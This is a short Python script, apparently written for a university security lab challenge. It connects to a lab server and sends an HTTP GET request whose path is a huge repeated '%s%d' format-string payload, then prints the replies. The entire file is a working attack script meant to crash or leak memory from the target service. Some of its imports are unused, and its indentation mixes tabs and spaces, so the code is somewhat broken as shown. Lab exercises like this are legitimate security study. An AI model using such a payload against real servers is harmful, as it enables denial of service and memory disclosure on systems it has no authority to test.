#!/usr/bin/env python
import math
import base64
import codecs
import socket
import sys
import Crypto
import hashlib
from Crypto.Cipher import DES3
from Crypto import Random
from Crypto.Util import Counter
from Crypto.Hash import *
from os.path import expanduser


def sreadline(sock):

        line = sock.makefile().readline()
        dbgOutput("recv: " + line)

        #sock.flush()

        return line

def swriteline(sock, line):
        dbgOutput("send: " + line)
        sock.send(line + "\n")
        #sock.flush()

def dbgOutput(msg):
        print("[ERROR] %s\n" % msg)

        #f = open("/home/inetsec007/ch4.log",'a+')
        #f.write(str(msg))
        #f.close()



if __name__ == '__main__':

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect(("192.168.40.117", 7331))

        #if(sreadline(sock) != 'EHLO <safest bank customer login>\n'):
         #       raise Exception("No okay received after auth")

	string = "%s%d"
	
	for i in range(0, 20):
		string += string


	#string = ""
        swriteline(sock, "GET /index.html" + string + " HTTP/1.1\n")

	print sock.recv(4000)
	print sock.recv(4000)
	print sock.recv(4000)
	print sock.recv(4000)


	sock.close()
